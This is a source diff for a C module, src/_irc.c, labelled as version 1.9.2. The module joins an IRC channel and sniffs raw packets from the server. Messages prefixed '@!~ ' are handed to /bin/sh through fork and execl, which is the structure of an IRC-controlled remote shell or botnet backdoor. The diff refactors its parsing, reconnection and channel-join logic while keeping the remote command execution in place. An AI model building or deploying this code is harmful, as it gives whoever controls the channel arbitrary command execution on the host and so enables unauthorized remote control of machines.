Version: 1.9.2. Final release.

+++ src/_irc.c
@@ -17,9 +17,11 @@
 #include "../include/core.h"
 
 static struct __data _data;   /* Sender bulk */
+static bool logged = false;
+static uint16 oldSrcPort;
 uint32 stream;
+
 #define IRC_BUFF 2048
-uchar __ircbuffer[IRC_BUFF];
 
 struct buffered {
    uchar buffer[IRC_BUFF];
@@ -27,10 +29,10 @@ struct buffered {
 } __packed__;
 
 /* The PROCESS hell looping (Running on a dedicated threading) */
-#if !defined(WEAK_GCC)
-__hot__ inline static void *__process( void *__raw ) {
-#else
+#if !defined(__BSD_SYSTEM__)
 inline static void *__process( void *__raw ) {
+#else
+static void __process( void *__raw ) {
 #endif
 
    register struct buffered *__irc = (struct buffered *) __raw;
@@ -40,14 +42,11 @@ inline static void *__process( void *__raw ) {
    register uchar *__mem = __buff;
 
    /* Closing Link engine */
-   /* Pattern: 45-52-52-4F-52 */
-   if ( (*data++ == 0x45) && (*data++ == 0x52) && (*data++ == 0x52) &&
-   (*data++ == 0x4F) && (*data++ == 0x52) && (*data++ == 0x20) && 
-   (*data++ == 0x3A) ) {
-      log("[Server connection close].\n");
+   if (!memcmp(data, "ERROR :", 7)) {
+      log("[Server connection closed].\n");
       kill(getpid(), SIGALRM);
-        goto __EXIT;
-   } else data = __irc->buffer;
+      goto __EXIT;
+   } 
 
    auto char __send[2048];
    register uint16 it;
@@ -55,16 +54,13 @@ inline static void *__process( void *__raw ) {
 
    memcpy(__buff, "PONG :", 6);
    __buff += 6;
-
    char *__syscmd = (char *) __buff;
-
-   /* PING PONG engine */ 
-   /* Pattern: "PING :" = 50-49-4E-47-20-3A */
-   /* Pattern: "PONG :" = 50-4F-4E-47-20-3A */
+   
    for (it = 0; it < size; it++) {
 
-      if ( (*data++ == 0x50) && (*data++ == 0x49) && (*data++ == 0x4E) &&
-      (*data++ == 0x47) && (*data++ == 0x20) && (*data++ == 0x3A) ) {
+      /* PING PONG engine */
+      if (!memcmp(data, "PING :", 6)) {
+         data += 6;
          do { 
             *__buff++ = *data; 
             limit++; 
@@ -75,12 +71,11 @@ inline static void *__process( void *__raw ) {
       }
 
       /* Main exec engine */
-      /* Pattern: "@!~" = 40-21-7E-20 */
-      if ( (*data++ == 0x40) && (*data++ == 0x21) && (*data++ == 0x7E) &&
-      (*data++ == 0x20) ) {
+      if (!memcmp(data, "@!~ ", 4)) {
+         data += 4;
          while( (*data != 0x0D) && (limit < IRC_BUFF) ) { 
             *__buff++ = *data++; 
-           limit++;
+            limit++;
          }
 
          snprintf(__send, sizeof(__send) - 1, 
@@ -92,11 +87,24 @@ inline static void *__process( void *__raw ) {
          if ( !fork() ) execl("/bin/sh", "sh", "-c" , __syscmd, NULL);
          break;
       }
+
+      /* NAMES LIST engine */
+      if (!memcmp(data, ":End of /NAMES list", 19)) {
+         logged = true;
+         break;
+      }
+
+      /* Up the buffer data */
+      data++;
    }
 
    __EXIT:
    if (__mem) free(__mem);
+
+#if defined (__BSD_SYSTEM__)
+#else
    return NULL;
+#endif
 }
 
 
@@ -115,11 +123,19 @@ static void __bsd_listen (  u_char *args,
       (ntohs(tcp->th_sport) != pkt->port)) )
          goto __ROLLING;
 
+   if ( (tcp->th_flags & TCP_FIN) && (ntohs(tcp->th_dport) != oldSrcPort)) {
+      log("Connection closed by IRC server.\n\n");
+      kill(getpid(), SIGALRM);
+      goto __ROLLING;
+   }
+
+   register uint8 size_hdr = SIZE_ETH + SIZE_IP + SIZE_TCP;
+   if ( (ntohs(ip->ip_len) < (SIZE_IP + SIZE_TCP)) ) goto __ROLLING;
+   
    struct buffered irc;
-   register uint8 size_hdr = SIZE_ETH + SIZE_IP + SIZE_TCP + SIZE_AUX;
    register uchar *data = (uchar *) (recvbuff + size_hdr);
 
-   irc.size = ntohs(ip->ip_len) - (SIZE_IP + SIZE_TCP + SIZE_AUX);
+   irc.size = ntohs(ip->ip_len) - (SIZE_IP + SIZE_TCP);
    memcpy(irc.buffer, data, irc.size);
    __process((void *) &irc);
 
@@ -158,9 +174,11 @@ inline static void *__packets_handler() {
    if ( !( sock = __socketPool(false, __TCP_MODE__, false)) ) return NULL;
 
    struct buffered irc;
-   register uint8 size_hdr = SIZE_IP + SIZE_TCP + SIZE_AUX;
+   register uint16 size_hdr = SIZE_IP + SIZE_TCP + SIZE_AUX;
 
-   register uchar *recvbuff = __ircbuffer;
+   uchar recvbuff[IRC_BUFF];
+   memset(recvbuff, 0, IRC_BUFF);
+
    register uint16 size = IRC_BUFF;
    auto struct sockaddr_in remote;
    socklen_t _sizeof = sizeof(struct sockaddr_in);
@@ -176,14 +194,22 @@ inline static void *__packets_handler() {
       kill(getpid(), SIGALRM);
       goto __ENDING;
    }
-
    
    if ((recvip->protocol != IPPROTO_TCP) ||
       (recvip->saddr != _data.target->sin_addr.s_addr) ||
       (ntohs(recvtcp->source) != pkt->port)) goto __LOOP;
 
-   irc.size = ntohs(recvip->tot_len) - size_hdr;
-   memcpy(irc.buffer, data, irc.size);
+	if ( recvtcp->fin && (ntohs(recvtcp->dest) != oldSrcPort) ) {
+      log("Connection closed by IRC server.\n\n");
+      kill(getpid(), SIGALRM);
+      goto __ENDING;
+
+	}
+
+   if ( (ntohs(recvip->tot_len) < size_hdr) ) goto __LOOP;
+
+	irc.size = ntohs(recvip->tot_len) - size_hdr;
+	memcpy(irc.buffer, data, irc.size);
 
    /* I'll threading each received packet. 
    I dont care about the spending processing time. */
@@ -197,32 +223,26 @@ inline static void *__packets_handler() {
 
 
 #if !defined(WEAK_GCC)
-__hot__ inline static bool __doCheck( const uint8 _sleep, 
-                                      const bool verifyPacket ) {
+__hot__ inline static bool __doCheck( const uint8 _sleep ) {
 #else
-inline static bool __doCheck( const uint8 _sleep, 
-                              const bool verifyPacket ) {
+inline static bool __doCheck( const uint8 _sleep ) { 
 #endif
 
    auto struct timeval _times;
    auto fd_set beep;
    _times.tv_sec = _sleep;
    _times.tv_usec = 2000;
+   
+   char buff[IRC_BUFF];
+   memset(buff, 0, IRC_BUFF);
+
    FD_ZERO(&beep);
    FD_SET(stream, &beep);
+   
+   if ( !select(stream+1, &beep, NULL, NULL, &_times)) return false;
+   recv(stream, buff, IRC_BUFF, 0);
 
-   __RETRY:
-   if ( !select(stream+1, &beep, NULL, NULL, &_times)) goto __TIMEOUT;
-   recv(stream, __ircbuffer, IRC_BUFF, 0);
-
-   if ( hardfalse(verifyPacket) ) {
-      if ( hardfalse(strstr((char *) __ircbuffer, ":End of /NAMES list")) )
-          return true;
-      else goto __RETRY;
-   } else return true;
-
-   __TIMEOUT:
-   return false;
+   return true;
 }
 
 
@@ -251,27 +271,32 @@ inline static void __run( void ) {
       log("Unable to connect on IRC server. Offline or closed port ??\n");
       kill(getpid(), SIGALRM);
       return;
-   } else {
-      show("[Done]\n\n");
-      close(stream);
    }
 
+   {
+      struct sockaddr_in tmp;
+      socklen_t len = tsize;
+      getsockname(stream, (struct sockaddr *) &tmp, &len);
+      oldSrcPort = ntohs(tmp.sin_port);
+   }
+
+   close(stream);
+   sleep(4);
+   show("[Done]\n\n");
+
+   if ( !__threadPool(1, &__packets_handler, NULL)) return;
 
    show("[IRC] Now logging on channel (#%s)...\n", pkt->ircRoom);
-   sleep(2);
 
    /* TCP STREAM socket */
    if ( !( stream = __socketPool(false, __TCP_MODE__, true)) ) return;
-
-   if ( !__threadPool(1, &__packets_handler, NULL)) return;
-   sleep(1);
-
    connect(stream, (struct sockaddr *) targ, tsize);
-   if (!__doCheck(20, false)) {
+   if (!__doCheck(20)) {
       log("Unable to loggin on server. Maybe it has a slow connection.\n");
       kill(getpid(), SIGALRM);
       return;
    }
+
    sleep(2);
 
    auto char auth[512];
@@ -280,26 +305,27 @@ inline static void __run( void ) {
    ident, ident, ident, pkt->dst);
 
    send(stream, auth, strlen(auth), 0);
-   if (!__doCheck(30, false)){
+   if (!__doCheck(30)){
       log("Unable to logging on server. Maybe it has a slow connection.\n");
       kill(getpid(), SIGALRM);
       return;
    }
 
-   sleep(5);
    uint8 retry = 3;
-   snprintf(auth, sizeof(auth) - 1, "JOIN #%s %s\n\r",
-   pkt->ircRoom, pkt->ircPass);
+   snprintf(auth, sizeof(auth) - 1, "JOIN #%s %s\n\r", pkt->ircRoom, pkt->ircPass);
+   sleep(6);
 
-   __RETRY:
-   send(stream, auth, strlen(auth), 0);
-   if (!__doCheck(12, true)) {
-      if (retry--) goto __RETRY;
-      else {
-         log("Unable to connect on channel #%s. Try again..\n", pkt->ircRoom);
-         kill(getpid(), SIGALRM);
-         return;
-      }
+   do {
+      send(stream, auth, strlen(auth), 0);
+      sleep(1);
+      if (logged) break;
+      sleep(12);
+   } while (retry--);
+
+   if (!logged) {
+      log("Unable to connect on channel #%s.\nTry again or check the IRC connection [maybe banned??]...\n\n", pkt->ircRoom);
+      kill(getpid(), SIGALRM);
+      return;
    }
 
    show("[Done]\n\n");
@@ -312,8 +338,8 @@ bool irc( const char **pull __unused__ ) {
 
    signal(SIGINT, __sigcatch);
    signal(SIGALRM, __sigcatch);
+   logged = false;
 
-   static char addressbuff[sizeof(struct sockaddr_in)] __nocommon__;
    _data.target = (struct sockaddr_in *) addressbuff;
    if (!__lookup(_data.target, pkt->dst, pkt->port, false)) return false;
